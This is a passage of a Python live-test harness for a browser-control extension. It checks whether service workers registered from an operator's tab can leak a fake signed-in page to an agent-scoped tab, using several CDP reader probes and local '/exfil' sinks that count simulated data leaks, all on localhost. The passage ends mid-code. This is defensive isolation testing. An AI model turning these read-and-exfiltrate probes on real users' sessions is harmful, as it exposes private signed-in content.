#!/usr/bin/env python3
"""Live check of the worker removal at a marked tab's leave (contract C5; board ab-v16.74, the
operator's answer ab-214), from the measure of board ab-v16.73 (sw-marked's harness): a service
worker of a host on no scope's list, registered from the operator's marked tab with "*", against a
navigation of a scope's tab to that host.

One private Xvfb, one Chromium with a copy of the unpacked agent/ of this checkout (or RECEIVER),
test/live/host.py as the native host, and this script as the stub daemon (C4 parts on the channels
main and bridge) and as the test sites' HTTP server on 127.0.0.1. No relay: the bridge's
Page.navigate reaches Chrome. It starts only its own Xvfb and Chromium and stops only those, by the
pids that it recorded. xdotool sends keys only to its own display. Every test site is a
*.localhost host of this server. It logs names, paths, ids, times and counts only; the made-up
sign-in cookie of the test site never enters a log (only whether a request carried it).

The cases, in order:
- before: two marked tabs ("*") register the workers of two hosts on no list (an own-page worker
  and a worker that answers with a cached signed-in page) and stay on them; a client-attached tab
  of scope A navigates there (a client's Page.navigate and a page script's link click). The
  worker's page commits and runs before layer 3 sends the tab away: the residue while the
  operator's tab is on the host. A host on no list with no worker is the control.
- after: both marked tabs leave their hosts; the same navigations: no commit of the worker's page.
- frame: a marked tab registers the own-page worker again; a second marked tab shows that host
  in a sub-frame of a page of another host; the first tab leaves: the worker stays (a frame of a
  marked tab shows the origin); after that page leaves too, no commit.
- race: the marked tab registers the worker, leaves, and a scope tab's Page.navigate starts 0, 100
  or 300 ms after the server saw the leave's request: the gap right after the leave.
- gone: the marked tab's next navigation to the host goes to the network (no worker).
- restore (RESTORE_TRIALS, default 0): C6's restore tab whose site redirects to the host.

Usage: test/live/workers.py [run folder] [port]
  run folder: default test/live/.run/workers-<stamp> (git-ignored); port: default LIVE_PORT or 8774.
Env: CHROMIUM (default /usr/bin/chromium), RECEIVER (the agent folder; default this checkout's
agent/), DISPLAY_N (default 142), TRIALS (20), CACHE_TRIALS (10), CTRL_TRIALS (5), AFTER_TRIALS
(20), FRAME_TRIALS (5), RACE_REPS (4), RESTORE_TRIALS (0), READERS (1), EAGER (0).
"""

import base64
import json
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import quote, unquote

REPO = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
RUN = os.path.abspath(sys.argv[1]) if len(sys.argv) > 1 else os.path.join(REPO, "test", "live", ".run", "workers-" + time.strftime("%Y%m%d-%H%M%S"))
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("LIVE_PORT", "8774"))
CHROMIUM = os.environ.get("CHROMIUM", "/usr/bin/chromium")
RECEIVER = os.environ.get("RECEIVER", os.path.join(REPO, "agent"))
DISPLAY_N = int(os.environ.get("DISPLAY_N", "142"))
with open(os.path.join(REPO, "docs", "protocol.md")) as _f:
    RECEIVER_ID = re.search(r"^- Receiver extension ID: `([a-p]{32})`$", _f.read(), re.M).group(1)
PART_BYTES = 700000

os.makedirs(RUN, exist_ok=False)
for d in ("home", "logs", "x", "shots", "frames", "profile/NativeMessagingHosts"):
    os.makedirs(os.path.join(RUN, d))
SOCK = os.path.join(RUN, "d.sock")
results = []
pids = {}
DISPLAY = None
AUTH = None


def now_ms():
    return time.time() * 1000.0


def check(name, ok, **detail):
    results.append({"check": name, "pass": bool(ok), **detail})
    print(("PASS " if ok else "FAIL ") + name + ("  " + json.dumps(detail) if detail else ""), flush=True)


# ---- the test sites ----

requests_seen = []
req_lock = threading.Lock()

PAGE = """<!doctype html><title>%(title)s</title><p>%(title)s
<script>
fetch("/beacon" + location.pathname);
function go(kind, url) {
  if (kind === "same") { const a = document.createElement("a"); a.href = url; document.body.appendChild(a); a.click(); }
  else if (kind === "assign") location.href = url;
  return "ok";
}
</script>"""

# The registration page: a worker for the whole host. mode own: it answers every navigation with
# its own page (from memory, no request). mode cache: the page first signs in (a made-up cookie),
# puts the signed-in page /signed-in into Cache Storage, and the worker answers every navigation
# with that cached page (no request).
REG = """<!doctype html><title>reg</title><script>
(async () => {
  if ("%(mode)s" === "cache") {
    await fetch("/login", {credentials: "same-origin"});
    const c = await caches.open("pages");
    await c.add("/signed-in");
  }
  await navigator.serviceWorker.register("/sw.js?mode=%(mode)s", {scope: "/"});
  await navigator.serviceWorker.ready;
  fetch("/beacon/sw-ready/%(mode)s");
})();
</script>"""

SW = """self.addEventListener("install", (e) => self.skipWaiting());
self.addEventListener("activate", (e) => e.waitUntil(self.clients.claim()));
const MODE = new URL(location.href).searchParams.get("mode");
self.addEventListener("fetch", (e) => {
  if (e.request.mode !== "navigate") return;
  const path = new URL(e.request.url).pathname;
  if (MODE === "cache") {
    e.respondWith(caches.match("/signed-in").then((r) => r || new Response("<!doctype html><title>no cache</title>", {headers: {"Content-Type": "text/html"}})));
    return;
  }
  e.respondWith(new Response('<!doctype html><title>sw page</title><body style="background:#f0f"><p>sw page ' + path +
    '<script>fetch("/beacon/swpage" + location.pathname)<\\/script>', {headers: {"Content-Type": "text/html"}}));
});"""

SIGNED = """<!doctype html><title>%(title)s</title><body style="background:#f0f"><p>%(title)s
<script>fetch("/beacon/swpage" + location.pathname, {credentials: "same-origin"});</script>"""


class Site(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        host = (self.headers.get("Host") or "").split(":")[0]
        path = self.path.split("?")[0]
        signed = "sid=" in (self.headers.get("Cookie") or "")
        with req_lock:
            requests_seen.append({"t": now_ms(), "host": host, "path": path, "signed": signed})
        q = dict(x.split("=", 1) for x in self.path.split("?", 1)[1].split("&")) if "?" in self.path else {}
        ctype = "text/html; charset=utf-8"
        extra = []
        status = 200
        if path == "/sw-reg":
            data = (REG % {"mode": q.get("mode", "own")}).encode()
        elif path == "/sw.js":
            data = SW.encode()
            ctype = "text/javascript"
        elif path == "/login":
            data = b"ok"
            ctype = "text/plain"
            extra.append(("Set-Cookie", "sid=made-up-test-value; Path=/; HttpOnly; SameSite=Lax"))
        elif path == "/signed-in":
            data = (SIGNED % {"title": "signed in (the operator)" if signed else "signed out"}).encode()
        elif path == "/magenta":
            data = b'<!doctype html><title>sitea magenta</title><body style="background:#f0f"><p>self test<script>fetch("/beacon/magenta")</script>'
        elif path == "/embed":
            # A page of this host with one frame of another origin (q "src", URL-encoded).
            data = ('<!doctype html><title>embed</title><p>embed<iframe src="%s" width="300" height="100"></iframe>'
                    '<script>fetch("/beacon/embed")</script>' % unquote(q.get("src", "about:blank")).replace('"', "")).encode()
        elif path == "/redir":
            status = 302
            data = b""
            extra.append(("Location", unquote(q.get("to", "/"))))
        else:
            data = (PAGE % {"title": host + path}).encode()
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        for k, v in extra:
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(data)


KNOWN_TITLES = ("sw page", "signed in (the operator)", "signed out", "sitea magenta")
posts_seen = []


def do_POST(self):
    host = (self.headers.get("Host") or "").split(":")[0]
    path = self.path.split("?")[0]
    n = min(int(self.headers.get("Content-Length") or 0), 4096)
    body = self.rfile.read(n).decode("utf-8", "replace") if n else ""
    with req_lock:
        posts_seen.append({"t": now_ms(), "host": host, "path": path, "title": body if body in KNOWN_TITLES else ("other" if body else "")})
    self.send_response(204)
    self.send_header("Content-Length", "0")
    self.end_headers()


Site.do_POST = do_POST


def posts(path):
    with req_lock:
        return [r for r in posts_seen if r["path"] == path]


def reqs(host=None, path=None):
    with req_lock:
        return [r for r in requests_seen if (host is None or r["host"] == host) and (path is None or r["path"] == path)]


# ---- the stub daemon ----


class Daemon:
    def __init__(self):
        self.conn = None
        self.lock = threading.Lock()
        self.res = {}
        self.cond = threading.Condition()
        self.events = []  # (arrival ms, msg)
        self.notices = []
        self.hellos = []
        self.seq = 0
        self.on_event = None  # a hook in the read thread: (at, msg); it may send, never wait

    def serve(self):
        srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        srv.bind(SOCK)
        os.chmod(SOCK, 0o600)
        srv.listen(4)
        while True:
            c, _ = srv.accept()
            with self.lock:
                self.conn = c
            threading.Thread(target=self.read, args=(c,), daemon=True).start()

    def read(self, c):
        buf = b""
        parts = {}
        while True:
            try:
                chunk = c.recv(1 << 20)
            except OSError:
                break
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                msg = json.loads(line)
                if msg.get("t") == "part" and msg.get("ch") == "bridge":
                    got = parts.setdefault(msg["id"], {})
                    got[msg["seq"]] = msg["b64"]
                    if len(got) < msg["n"]:
                        continue
                    del parts[msg["id"]]
                    msg = json.loads(b"".join(base64.b64decode(got[i]) for i in range(msg["n"])))
                at = now_ms()
                hook = None
                with self.cond:
                    t = msg.get("t")
                    if t == "hello":
                        self.hellos.append(msg)
                    elif t == "res":
                        msg["_at"] = at
                        self.res[(msg.get("ch", "main"), msg["id"])] = msg
                    elif t == "ev":
                        self.events.append((at, msg))
                        hook = self.on_event
                    elif t == "blocked":
                        self.notices.append((at, msg))
                    self.cond.notify_all()
                if hook:
                    try:
                        hook(at, msg)
                    except Exception as e:  # a hook's failure must not stop the reader
                        print("hook error", type(e).__name__, e, flush=True)
        with self.lock:
            if self.conn is c:
                self.conn = None

    def send(self, ch, req):
        body = json.dumps(req, separators=(",", ":")).encode()
        n = max(1, -(-len(body) // PART_BYTES))
        lines = b""
        for i in range(n):
            part = {"t": "part", "ch": ch, "id": req["id"], "seq": i, "n": n, "b64": base64.b64encode(body[i * PART_BYTES:(i + 1) * PART_BYTES]).decode()}
            lines += json.dumps(part, separators=(",", ":")).encode() + b"\n"
        with self.lock:
            self.conn.sendall(lines)

    def _id(self, ch):
        with self.lock:
            self.seq += 1
            return f"{ch[0]}{self.seq}"

    def call(self, ch, op, timeout=15, **fields):
        rid = self._id(ch)
        self.send(ch, {"t": "req", "id": rid, "op": op, **fields})
        return self.wait_res(rid, timeout, ch)

    def call_nowait(self, ch, op, **fields):
        rid = self._id(ch)
        self.send(ch, {"t": "req", "id": rid, "op": op, **fields})
        return rid

    def main(self, op, timeout=15, **fields):
        return self.call("main", op, timeout=timeout, **fields)

    def bridge(self, op, args, wait=None):
        f = {"args": args}
        if wait is not None:
            f["wait"] = wait
        return self.call("bridge", op, **f)

    def wait_res(self, rid, timeout=15, ch="bridge"):
        deadline = time.time() + timeout
        with self.cond:
            while (ch, rid) not in self.res:
                left = deadline - time.time()
                if left <= 0:
                    return {"timeout": True}
                self.cond.wait(left)
            return self.res[(ch, rid)]

    def peek_res(self, rid, ch="bridge"):
        with self.cond:
            return self.res.get((ch, rid))

    def wait_hello(self, count, timeout=30):
        deadline = time.time() + timeout
        with self.cond:
            while len(self.hellos) < count:
                left = deadline - time.time()
                if left <= 0:
                    return False
                self.cond.wait(left)
            return True

    def set_scopes(self, obj):
        return self.main("set_scopes", **obj)


D = Daemon()

# ---- start everything ----


def write_xauth(display, path):
    field = lambda b: struct.pack(">H", len(b)) + b
    entry = struct.pack(">H", 0xFFFF) + field(b"") + field(str(display).encode()) + field(b"MIT-MAGIC-COOKIE-1") + field(os.urandom(16))
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    with os.fdopen(fd, "wb") as f:
        f.write(entry)


procs = []


def start():
    global DISPLAY, AUTH
    httpd = ThreadingHTTPServer(("127.0.0.1", PORT), Site)
    httpd.daemon_threads = True
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    threading.Thread(target=D.serve, daemon=True).start()
    disp = DISPLAY_N
    if os.path.exists(f"/tmp/.X11-unix/X{disp}") or os.path.exists(f"/tmp/.X{disp}-lock"):
        raise SystemExit(f"display :{disp} is in use")
    auth = os.path.join(RUN, "x", "auth")
    write_xauth(disp, auth)
    DISPLAY, AUTH = disp, auth
    xvfb = subprocess.Popen(["Xvfb", f":{disp}", "-nolisten", "tcp", "-auth", auth, "-screen", "0", "1280x900x24"],
                            stdout=open(os.path.join(RUN, "logs", "xvfb.log"), "w"), stderr=subprocess.STDOUT)
    procs.append(("xvfb", xvfb))
    pids["xvfb"] = xvfb.pid
    pids["display"] = disp
    for _ in range(50):
        if os.path.exists(f"/tmp/.X11-unix/X{disp}"):
            break
        time.sleep(0.2)
    agent = os.path.join(RUN, "agent")
    shutil.copytree(RECEIVER, agent, ignore=shutil.ignore_patterns("_metadata"))
    host = os.path.join(RUN, "native-host")
    with open(host, "w") as f:
        f.write(f'#!/bin/sh\nexec /usr/bin/python3 "{REPO}/test/live/host.py" --socket "{SOCK}" --log "{RUN}/logs/host.log" "$@"\n')
    os.chmod(host, 0o700)
    with open(os.path.join(RUN, "profile", "NativeMessagingHosts", "sh.agentwatch.browser.json"), "w") as f:
        json.dump({"name": "sh.agentwatch.browser", "description": "ab-v16.74 live check", "path": host, "type": "stdio",
                   "allowed_origins": [f"chrome-extension://{RECEIVER_ID}/"]}, f)
    env = {"HOME": os.path.join(RUN, "home"), "PATH": "/usr/bin:/bin", "LANG": "C.UTF-8", "DISPLAY": f":{disp}", "XAUTHORITY": auth}
    chrome = subprocess.Popen([CHROMIUM, f"--user-data-dir={os.path.join(RUN, 'profile')}", "--no-first-run", "--no-default-browser-check",
                               "--password-store=basic", f"--load-extension={agent}", "--silent-debugger-extension-api",
                               "--window-position=0,0", "--window-size=1280,900", "about:blank"],
                              env=env, stdout=open(os.path.join(RUN, "logs", "chromium.log"), "w"), stderr=subprocess.STDOUT)
    procs.append(("chromium", chrome))
    pids["chromium"] = chrome.pid
    with open(os.path.join(RUN, "pids.json"), "w") as f:
        json.dump(pids, f)
    return chrome


def stop():
    for name, p in reversed(procs):
        if p.poll() is None:
            p.terminate()
            try:
                p.wait(10)
            except subprocess.TimeoutExpired:
                p.kill()
                p.wait(5)


def xenv():
    return {"DISPLAY": f":{DISPLAY}", "XAUTHORITY": AUTH, "PATH": "/usr/bin:/bin"}


def xdo(*args):
    return subprocess.run(["xdotool", *args], env=xenv(), timeout=20, capture_output=True, text=True)


def shot(name):
    subprocess.run(["ffmpeg", "-loglevel", "error", "-y", "-f", "x11grab", "-video_size", "1280x900", "-i", f":{DISPLAY}", "-frames:v", "1",
                    os.path.join(RUN, "shots", name + ".png")], env=xenv(), timeout=20)


def url(host, path):
    return f"http://{host}:{PORT}{path}"


def origin(host):
    return f"http://{host}:{PORT}"


def tabs():
    return D.bridge("tabs.query", [{}]).get("data") or []


def tab_ids():
    return sorted(t["id"] for t in tabs())


def evs_since(mark):
    with D.cond:
        return list(D.events[mark:])


def notices_since(mark):
    with D.cond:
        return list(D.notices[mark:])


def wait_for(fn, timeout):
    deadline = time.time() + timeout
    while time.time() < deadline:
        v = fn()
        if v:
            return v
        time.sleep(0.02)
    return fn()


def created_since(mark):
    return [m for at, m in evs_since(mark) if m.get("ev") == "tabs.onCreated"]


def new_tab_since(mark, timeout=5):
    got = wait_for(lambda: created_since(mark), timeout)
    return got[0] if got else None


def operator_key(keys):
    """The operator's key press in the live view: on the private display, to the focused window."""
    xdo("mousemove", "640", "450")
    xdo("key", keys)


def tab_url(tab_id):
    t = D.bridge("tabs.get", [tab_id]).get("data") or {}
    return t.get("url") or t.get("pendingUrl")


def operator_tab(keys="ctrl+t"):
    mark = len(D.events)
    operator_key(keys)
    ev = new_tab_since(mark)
    time.sleep(0.3)
    return ev


def operator_goes(u):
    """The operator types a URL into the focused tab's address bar (Ctrl+L first)."""
    xdo("key", "ctrl+l")
    time.sleep(0.15)
    xdo("type", "--delay", "12", u)
    time.sleep(0.15)
    xdo("key", "Delete")  # no inline autocompletion
    xdo("key", "Return")


def register(host, mode):
    """The focused marked tab opens the host's registration page and waits for its worker."""
    path = f"/beacon/sw-ready/{mode}"
    before = len(reqs(host, path))
    operator_goes(url(host, f"/sw-reg?mode={mode}"))
    return bool(wait_for(lambda: len(reqs(host, path)) > before, 10))


def focus(tab_id):
    """The operator selects the tab in the live view (Ctrl+<n>, by its index in the window)."""
    t = D.bridge("tabs.get", [tab_id]).get("data") or {}
    if not isinstance(t.get("index"), int) or t["index"] > 7:
        return False
    xdo("mousemove", "640", "450")
    xdo("key", f"ctrl+{t['index'] + 1}")
    return bool(wait_for(lambda: (D.bridge("tabs.get", [tab_id]).get("data") or {}).get("active"), 3))


def leave(tab_id, path):
    """The operator's marked tab leaves for a page of a host with no worker; the server's time of
    that page's request (the commit follows it)."""
    if not focus(tab_id):
        return None
    operator_goes(url(NOWORKER, path))
    got = wait_for(lambda: reqs(NOWORKER, path), 5)
    return got[0]["t"] if got else None


def is_marked(tab_id):
    r = D.bridge("debugger.attach", [tab_id])
    if r.get("ok"):
        D.bridge("debugger.detach", [tab_id])
    return r.get("error") == "not an agent tab"


def loaded(host, path, timeout=6):
    return bool(wait_for(lambda: reqs(host, path) and reqs(host, "/beacon" + path), timeout))


def agent_tab(scope, host="sitea.localhost", path="/a1"):
    r = D.bridge("tabs.create", [{"url": "about:blank", "active": True}, scope])
    tab = r["data"]["id"]
    D.bridge("debugger.attach", [tab])
    D.bridge("debugger.sendCommand", [{"tabId": tab}, "Page.navigate", {"url": url(host, path)}])
    return tab


def cdp(tab, method, params=None):
    return D.bridge("debugger.sendCommand", [{"tabId": tab}, method, params or {}])


def evaluate(tab, expr):
    return cdp(tab, "Runtime.evaluate", {"expression": expr, "userGesture": True, "returnByValue": True})


def nav_cdp(tab, u):
    return cdp(tab, "Page.navigate", {"url": u})


def at_blank(tab, timeout=3):
    return bool(wait_for(lambda: (tab_url(tab) or "") == "about:blank", timeout))


def notices_for(tab, mark):
    return [m for at, m in notices_since(mark) if m.get("tab") == tab]


def blocked_msg(tab, host, scope, frm):
    return {"t": "blocked", "tab": tab, "host": host, "scope": scope, "from": frm}


def pct(xs):
    xs = sorted(x for x in xs if x is not None)
    if not xs:
        return None
    return {"min": round(xs[0], 1), "median": round(xs[len(xs) // 2], 1), "max": round(xs[-1], 1), "n": len(xs)}


# ---- the cases ----

LISTS = {"la": ["sitea.localhost"], "lb": ["siteb.localhost"]}
SCOPES = {"scope-a": "la", "scope-b": "lb"}
FREE = "www.nolist.localhost"  # on no list; the marked tab registers its own-page worker
FREE_C = "app.nolist2.localhost"  # on no list; the marked tab signs in and registers its cache worker
NOWORKER = "www.noworker.localhost"  # on no list, no worker: the control
SITER = "www.siter.localhost"  # the import's site (C6), on no list
N = int(os.environ.get("TRIALS", "20"))
NC = int(os.environ.get("CACHE_TRIALS", "10"))
NCTRL = int(os.environ.get("CTRL_TRIALS", "5"))
NR = int(os.environ.get("RESTORE_TRIALS", "0"))
NA = int(os.environ.get("AFTER_TRIALS", "20"))
NF = int(os.environ.get("FRAME_TRIALS", "5"))
NRACE = int(os.environ.get("RACE_REPS", "4"))
READ = "location.href + '\\n' + document.title"
READERS = os.environ.get("READERS", "1") == "1"  # 0: only Page.enable (the commit's time), no reader


def scopes_obj(operator="*"):
    return {"lists": LISTS, "scopes": SCOPES, "default": None, "operator": operator}


WORKER_TITLES = ("sw page", "signed in (the operator)")
_mag = {}


def magenta(fn):
    """True when the frame's average color is the worker page's magenta (#f0f): ffmpeg scales it to
    one pixel. A white page (about:blank, a page of sitea) gives green near 255."""
    if fn in _mag:
        return _mag[fn]
    out = subprocess.run(["ffmpeg", "-loglevel", "error", "-i", fn, "-vf", "scale=1:1", "-f", "rawvideo", "-pix_fmt", "rgb24", "-"],
                         capture_output=True, timeout=20).stdout
    v = len(out) >= 3 and out[1] < 160 and out[0] > 150 and out[2] > 150
    _mag[fn] = v
    return v


class Reader:
    """An attached client's reads of tab a during one navigation.

    poll: Runtime.evaluate of location and title, one after the other, from the command on.
    event: on Runtime.executionContextCreated of the target origin (the default context of a
    frame), a Runtime.evaluate in that context at once (as a CDP client that follows the page's
    contexts would), sent from the daemon's read thread.
    init: the client's own script in each new document (Page.addScriptToEvaluateOnNewDocument,
    as Playwright's addInitScript) calls a binding (Runtime.addBinding, as exposeBinding) with
    location and title at DOMContentLoaded; the payload comes as Runtime.bindingCalled.
    body: Network.getResponseBody of the page's Document response, at its loadingFinished (from
    the read thread) and once more after the trial (as Playwright's response.body())."""

    def __init__(self, tab, host):
        self.tab = tab
        self.origin = origin(host)
        self.t0 = None
        self.stop = False
        self.polls = []  # (sent ms, answered ms, value or error)
        self.ev_reads = []  # (ctx ms, rid)
        self.commits = []  # (ms, url) of Page.frameNavigated of the main frame
        self.ctx = []  # ms of executionContextCreated of the origin
        self.bound = []  # (ms, payload) of Runtime.bindingCalled of the origin
        self.doc_req = None  # the requestId of the Document request to the origin
        self.body_reads = []  # (ms, rid) of Network.getResponseBody at loadingFinished
        self.late_body = None
        self.titles = []  # (ms, title) of tabs.onUpdated of the tab (the bridge's event to the relay)
        self.frames = []  # (ms, file) of Page.screencastFrame
        self.shots = []  # (sent ms, answered ms, file or error) of Page.captureScreenshot
        self.label = None

    def hook(self, at, msg):
        if msg.get("ev") == "tabs.onUpdated" and msg.get("tabId") == self.tab:
            t = (msg.get("changeInfo") or {}).get("title") or (msg.get("tab") or {}).get("title")
            if t:
                self.titles.append((at, t))
            return
        if msg.get("ev") != "debugger.onEvent" or (msg.get("source") or {}).get("tabId") != self.tab:
            return
        method = msg.get("method")
        p = msg.get("params") or {}
        if method == "Page.screencastFrame":
            D.call_nowait("bridge", "debugger.sendCommand", args=[{"tabId": self.tab}, "Page.screencastFrameAck", {"sessionId": p.get("sessionId")}])
            if self.label and at - self.t0 < 600 and p.get("data"):
                fn = os.path.join(RUN, "frames", f"{self.label}-f{len(self.frames)}.jpg")
                with open(fn, "wb") as f:
                    f.write(base64.b64decode(p["data"]))
                self.frames.append((at, fn))
            return
        if method == "Page.frameNavigated" and not (p.get("frame") or {}).get("parentId"):
            self.commits.append((at, (p.get("frame") or {}).get("url")))
        elif method == "Runtime.bindingCalled" and p.get("name") == "__awRead":
            if str(p.get("payload") or "").startswith(self.origin):
                self.bound.append((at, p.get("payload")))
        elif method == "Network.requestWillBeSent" and p.get("type") == "Document" and str((p.get("request") or {}).get("url") or "").startswith(self.origin):
            self.doc_req = p.get("requestId")
        elif method == "Network.loadingFinished" and self.doc_req and p.get("requestId") == self.doc_req:
            rid = D.call_nowait("bridge", "debugger.sendCommand", args=[{"tabId": self.tab}, "Network.getResponseBody", {"requestId": self.doc_req}])
            self.body_reads.append((at, rid))
        elif method == "Runtime.executionContextCreated":
            c = p.get("context") or {}
            if c.get("origin") == self.origin and (c.get("auxData") or {}).get("isDefault"):
                self.ctx.append(at)
                rid = D.call_nowait("bridge", "debugger.sendCommand",
                                    args=[{"tabId": self.tab}, "Runtime.evaluate", {"expression": READ, "returnByValue": True, "contextId": c.get("id")}])
                self.ev_reads.append((at, rid))

    def poll_loop(self):
        while not self.stop:
            s = now_ms()
            r = D.bridge("debugger.sendCommand", [{"tabId": self.tab}, "Runtime.evaluate", {"expression": READ, "returnByValue": True}])
            e = now_ms()
            v = ((r.get("data") or {}).get("result") or {}).get("value") if r.get("ok") else ("error: " + str(r.get("error")))
            self.polls.append((s, e, v))
            if e - self.t0 > 1500:
                break

    def shot_loop(self):
        while not self.stop:
            s = now_ms()
            r = D.bridge("debugger.sendCommand", [{"tabId": self.tab}, "Page.captureScreenshot", {"format": "jpeg", "quality": 40}])
            e = now_ms()
            if r.get("ok") and self.label:
                fn = os.path.join(RUN, "frames", f"{self.label}-s{len(self.shots)}.jpg")
                with open(fn, "wb") as f:
                    f.write(base64.b64decode((r.get("data") or {}).get("data") or ""))
                self.shots.append((s, e, fn))
            else:
                self.shots.append((s, e, "error: " + str(r.get("error"))))
            if e - self.t0 > 600:
                break

    def after(self):
        if self.doc_req:
            r = D.bridge("debugger.sendCommand", [{"tabId": self.tab}, "Network.getResponseBody", {"requestId": self.doc_req}])
            self.late_body = r

    @staticmethod
    def body_title(r):
        if not r or not r.get("ok"):
            return None
        b = (r.get("data") or {}).get("body") or ""
        i = b.find("<title>")
        j = b.find("</title>")
        return b[i + 7:j] if i >= 0 and j > i else None

    def summary(self):
        rel = lambda x: round(x - self.t0, 1)
        hit = [(s, e, v) for s, e, v in self.polls if isinstance(v, str) and v.startswith(self.origin)]
        evr = []
        for at, rid in self.ev_reads:
            r = D.peek_res(rid) or {}
            v = ((r.get("data") or {}).get("result") or {}).get("value") if r.get("ok") else ("error: " + str(r.get("error")) if r else "no answer")
            evr.append({"ctx_ms": rel(at), "answer_ms": rel(r["_at"]) if r.get("_at") else None,
                        "read": isinstance(v, str) and v.startswith(self.origin), "title": v.split("\n", 1)[1] if isinstance(v, str) and "\n" in v and v.startswith(self.origin) else None,
                        "error": v if isinstance(v, str) and v.startswith("error") else None})
        bodies = []
        for at, rid in self.body_reads:
            r = D.peek_res(rid) or {}
            bodies.append({"at_ms": rel(at), "answer_ms": rel(r["_at"]) if r.get("_at") else None, "title": self.body_title(r),
                           "error": None if r.get("ok") else str(r.get("error"))})
        commit = next((at for at, u in self.commits if (u or "").startswith(self.origin)), None)
        blank = next((at for at, u in self.commits if (u or "") == "about:blank" and commit is not None and at >= commit), None)
        return {
            "commit_ms": rel(commit) if commit else None,
            "blank_ms": rel(blank) if blank else None,
            "ctx_ms": rel(self.ctx[0]) if self.ctx else None,
            "poll_n": len(self.polls),
            "poll_read": bool(hit),
            "poll_first_ms": rel(hit[0][1]) if hit else None,
            "poll_title": hit[0][2].split("\n", 1)[1] if hit else None,
            "ev_read": any(x["read"] for x in evr),
            "ev_reads": evr[:2],
            "init_read": bool(self.bound),
            "init_ms": rel(self.bound[0][0]) if self.bound else None,
            "init_title": self.bound[0][1].split("\n", 1)[1] if self.bound and "\n" in self.bound[0][1] else None,
            "doc_req": bool(self.doc_req),
            "body_read": any(b["title"] for b in bodies),
            "body_title": next((b["title"] for b in bodies if b["title"]), None),
            "bodies": bodies[:2],
            "late_body_title": self.body_title(self.late_body),
            "late_body_error": None if not self.late_body or self.late_body.get("ok") else str(self.late_body.get("error")),
            "polls": [[rel(a), rel(b), (v or "")[:60]] for a, b, v in self.polls if a - self.t0 < 400][:40],
            "title_read": any(t in WORKER_TITLES for at, t in self.titles),
            "title_ms": next((rel(at) for at, t in self.titles if t in WORKER_TITLES), None),
            "title_value": next((t for at, t in self.titles if t in WORKER_TITLES), None),
            "frames": [[rel(at), magenta(fn)] for at, fn in self.frames],
            "frame_read": any(magenta(fn) for at, fn in self.frames),
            "frame_ms": next((rel(at) for at, fn in self.frames if magenta(fn)), None),
            "shots": [[rel(a), rel(b), magenta(fn) if not fn.startswith("error") else fn[:60]] for a, b, fn in self.shots][:30],
            "shot_read": any(not fn.startswith("error") and magenta(fn) for a, b, fn in self.shots),
            "shot_ms": next((rel(b) for a, b, fn in self.shots if not fn.startswith("error") and magenta(fn)), None),
        }


def trials(a, host, kind, prefix, n, scope="scope-a", frm="sitea.localhost"):
    """n navigations of tab a (scope-a) to host, each from a page of sitea: kind cdp (a client's
    Page.navigate) or same (a page script's same-tab link click)."""
    rows = []
    for i in range(n):
        start_path = f"/{prefix}-{kind}-start-{i}"
        nav_cdp(a, url("sitea.localhost", start_path))
        loaded("sitea.localhost", start_path)
        time.sleep(0.1)
        path = f"/{prefix}/{kind}{i}"
        rd = Reader(a, host)
        rd.label = f"{prefix}-{kind}{i}"
        mark = len(D.notices)
        rd.t0 = now_ms()
        D.on_event = rd.hook
        th = threading.Thread(target=rd.poll_loop if READERS else (lambda: None), daemon=True)
        if kind == "cdp":
            rid = D.call_nowait("bridge", "debugger.sendCommand", args=[{"tabId": a}, "Page.navigate", {"url": url(host, path)}])
        else:
            rid = D.call_nowait("bridge", "debugger.sendCommand", args=[{"tabId": a}, "Runtime.evaluate",
                                                                        {"expression": f"go('same', {json.dumps(url(host, path))})", "userGesture": True, "returnByValue": True}])
        th.start()
        wait_for(lambda: notices_for(a, mark), 3)
        blank = at_blank(a)
        time.sleep(0.4)
        rd.stop = True
        th.join(3)
        D.on_event = None
        rd.after()
        time.sleep(0.2)
        got = notices_for(a, mark)
        ex_t = posts("/exfil/title" + path)
        ex_f = posts("/exfil/fetch" + path)
        first_notice = next((at for at, m in notices_since(mark) if m.get("tab") == a), None)
        beacons = reqs(host, "/beacon/swpage" + path)
        row = {
            "notices": len(got),
            "right": got == [blocked_msg(a, host, scope, frm)],
            "blank": blank,
            "ran": bool(beacons),
            "beacon_signed": bool(beacons and beacons[0]["signed"]),
            "net": bool(reqs(host, path)),
            "notice_ms": round(first_notice - rd.t0, 1) if first_notice else None,
            "beacon_ms": round(beacons[0]["t"] - rd.t0, 1) if beacons else None,
            "exfil_title": ex_t[0]["title"] if ex_t else None,
            "exfil_title_ms": round(ex_t[0]["t"] - rd.t0, 1) if ex_t else None,
            "exfil_fetch": ex_f[0]["title"] if ex_f else None,
            **rd.summary(),
        }
        rows.append(row)
    return rows


def report(label, rows):
    n = len(rows)
    agg = {
        "trials": n,
        "blank_with_one_right_notice": sum(1 for x in rows if x["notices"] == 1 and x["right"] and x["blank"]),
        "network_request": sum(x["net"] for x in rows),
        "commit_seen_by_client": sum(1 for x in rows if x["commit_ms"] is not None),
        "script_ran_beacon": sum(x["ran"] for x in rows),
        "beacon_with_signin_cookie": sum(x["beacon_signed"] for x in rows),
        "client_read_poll": sum(x["poll_read"] for x in rows),
        "client_read_event": sum(x["ev_read"] for x in rows),
        "client_read_init_script": sum(x["init_read"] for x in rows),
        "client_read_body_at_load": sum(x["body_read"] for x in rows),
        "client_read_body_after": sum(1 for x in rows if x["late_body_title"]),
        "client_read_title_event": sum(x["title_read"] for x in rows),
        "client_init_script_sent_title": sum(1 for x in rows if x["exfil_title"] in WORKER_TITLES),
        "client_init_script_fetch_signed_in": sum(1 for x in rows if x["exfil_fetch"] == "signed in (the operator)"),
        "client_init_script_fetch_any": sum(1 for x in rows if x["exfil_fetch"]),
